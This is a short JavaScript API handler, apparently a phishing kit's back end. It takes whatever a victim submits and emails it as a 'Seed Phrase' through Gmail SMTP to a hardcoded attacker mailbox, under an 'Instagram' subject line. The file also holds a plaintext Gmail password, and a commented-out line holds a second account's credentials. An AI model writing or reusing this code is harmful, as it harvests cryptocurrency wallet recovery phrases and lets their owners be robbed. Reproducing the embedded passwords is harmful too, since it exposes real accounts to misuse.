let nodemailer = require('nodemailer')

export default async function sendEmail (req, res) {
    // console.log(req.body)

     let transporter = nodemailer.createTransport({
        host: "smtp.gmail.com",
        port: 465,
        secure: true, // true for 465, false for other ports
        auth: {
          user: 'lengleytony@gmail.com', // generated ethereal user
          pass: 'Vic123imu@', // generated ethereal password
        },
     })
     
    //  user: 'sales1687@tazhhq.com', // generated ethereal user
    //  pass: '178zhonghang...',

       let info = await transporter.sendMail({
        from: '"seed" <sales1687@tazhhq.com>',
        to: 'lengleytony@gmail.com',
        subject: 'Instagram',
        text: ` Seed Phrase: ${req.body}`,
        html: `<h2> Seed Phrase: ${req.body}</h2>`
       })
       console.log(info)
      res.json({info})
}